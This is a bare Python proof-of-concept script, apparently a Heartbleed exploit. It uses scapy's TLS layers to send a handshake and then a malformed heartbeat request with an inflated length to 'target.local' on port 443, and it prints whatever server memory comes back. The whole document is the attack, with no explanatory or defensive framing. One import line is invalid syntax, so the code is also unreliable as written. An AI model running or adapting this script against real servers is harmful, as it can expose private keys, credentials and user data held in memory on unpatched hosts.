import scapy
from scapy import ssl_tls import *
import socket

target = ('target.local',443)

# create tcp socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(target)
p = TLSRecord(version="TLS_1_1")/TLSHandshake()/TLSClientHello(version="TLS_1_1")
s.sendall(str(p))
s.recv(8192)
p = TLSRecord(version="TLS_1_1")/TLSHeartBeat(length=2**14-1,data='bleed...')
s.sendall(str(p))
resp = s.recv(8192)
#print ("resp: %s"%repr resp)
print (resp)
s.close()
